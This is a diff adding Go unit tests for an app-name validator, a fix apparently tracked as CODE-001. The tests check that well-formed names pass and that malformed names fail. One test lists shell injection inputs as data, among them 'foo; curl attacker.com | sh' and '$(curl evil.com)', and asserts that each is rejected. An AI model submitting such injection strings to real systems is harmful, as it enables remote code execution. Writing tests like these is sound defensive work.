@@ -113,3 +113,74 @@ func TestValidateAppPath_TrailingSlash(t *testing.T) {
 		t.Error("ValidateAppPath should reject trailing slash")
 	}
 }
+
+// ---------------------------------------------------------------------------
+// ValidateAppName tests (CODE-001 fix)
+// ---------------------------------------------------------------------------
+
+func TestValidateAppName_ValidNames(t *testing.T) {
+	valid := []string{
+		"api",
+		"web",
+		"worker",
+		"my-app",
+		"frontend-v2",
+		"a",
+		"abc123",
+		"a-b-c",
+	}
+
+	for _, name := range valid {
+		if err := ValidateAppName(name); err != nil {
+			t.Errorf("ValidateAppName(%q) should be valid, got error: %v", name, err)
+		}
+	}
+}
+
+func TestValidateAppName_Empty(t *testing.T) {
+	err := ValidateAppName("")
+	if err == nil {
+		t.Error("ValidateAppName should reject empty name")
+	}
+}
+
+func TestValidateAppName_ShellInjection(t *testing.T) {
+	// CODE-001: these are the exact attack vectors that were possible before the fix
+	injection := []string{
+		"foo; curl attacker.com | sh",
+		"foo$(whoami)",
+		"foo`id`",
+		"foo|bar",
+		"foo&bar",
+		"foo\nbar",
+		"foo bar",
+		"foo;bar",
+		"$(curl evil.com)",
+	}
+
+	for _, name := range injection {
+		err := ValidateAppName(name)
+		if err == nil {
+			t.Errorf("ValidateAppName(%q) should reject shell injection attempt", name)
+		}
+	}
+}
+
+func TestValidateAppName_InvalidFormat(t *testing.T) {
+	invalid := []string{
+		"MyApp",         // uppercase not allowed
+		"123app",        // must start with letter
+		"-app",          // must start with letter
+		"app_name",      // underscores not allowed (RFC 1123)
+		"app.name",      // dots not allowed
+		"app/name",      // slashes not allowed
+		strings.Repeat("a", 64), // too long (max 63)
+	}
+
+	for _, name := range invalid {
+		err := ValidateAppName(name)
+		if err == nil {
+			t.Errorf("ValidateAppName(%q) should reject invalid format", name)
+		}
+	}
+}
